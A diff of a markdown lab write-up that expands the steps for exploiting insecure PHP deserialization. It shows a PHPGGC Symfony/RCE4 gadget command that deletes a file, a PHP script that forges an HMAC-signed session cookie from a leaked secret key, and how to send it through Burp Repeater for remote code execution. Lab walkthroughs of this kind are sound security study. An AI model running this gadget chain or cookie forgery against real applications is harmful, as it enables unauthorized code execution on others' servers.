@@ -159,19 +159,59 @@ The application signs its serialized cookies with an HMAC signature to prevent t
 
     ![image](/images/Pasted%20image%2020251221133258.png)
 
-2.  **Generate Gadget:**
-    Use **PHPGGC** to generate a payload for the framework (e.g., Symfony RCE).
-    Command: `./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64`.
+2. **Weaponize (Generate Payload)**
 
-3.  **Sign Payload:**
-    Write a PHP script to sign your malicious object using the stolen secret key.
-    ```
-    $sig = hash_hmac('sha1', $malicious_object, $secret_key);
-    ```
+    You need a serialized object that deletes the file using a known Symfony exploit chain.
+    Download `PHPGGC` and run the following command in your terminal:
+   ```
+      ./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64
+   ```
+    Copy the resulting Base64 string.
+
+    ![image](/images/Pasted%20image%2020251221133232.png)
+
+
+3. **Sign the Payload (Forge Cookie)**
+
+  Create a local PHP script (e.g., `sign.php`) to combine your payload with the leaked key and generate a valid signature.
+    
+  Paste the following code, replacing the placeholders with your actual data:
+```
+<?php
+// 1. Paste the Base64 output from PHPGGC here
+$object = "YOUR_PHPGGC_BASE64_OUTPUT";
+
+// 2. Paste the key found in phpinfo.php here
+$secretKey = "YOUR_LEAKED_SECRET_KEY";
+ 
+// 3. Generate the JSON and HMAC signature
+$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
+ 
+echo $cookie;
+```
+Run the script: `php sign.php`.
+Copy the output.
+
+OR
+
+Use `hackvector`
+![image](/images/Pasted%20image%2020251221133355.png)
+
+OR 
+
+[Free Online HMAC Generator / Checker Tool (MD5, SHA-256, SHA-512) - FreeFormatter.com](https://www.freeformatter.com/hmac-generator.html#before-output)
+
+![image](/images/Pasted%20image%2020251221133436.png)
+
+
    
+4. Execute and Solve
 
-4.  **Execute:**
-    Update the cookie with the new object and the valid signature. The server accepts it as authentic and executes the code.
+Go back to **Burp Repeater**.
+Replace the entire `session` cookie value with the output from your PHP script.
+**Send** the request.
+The server checks the signature -> It matches (thanks to the leaked key) -> It deserializes the object -> The `Symfony/RCE4` gadget chain triggers -> The file is deleted -> Lab solved.
+
 
 **IMPACT:** Authenticated Remote Code Execution.
 
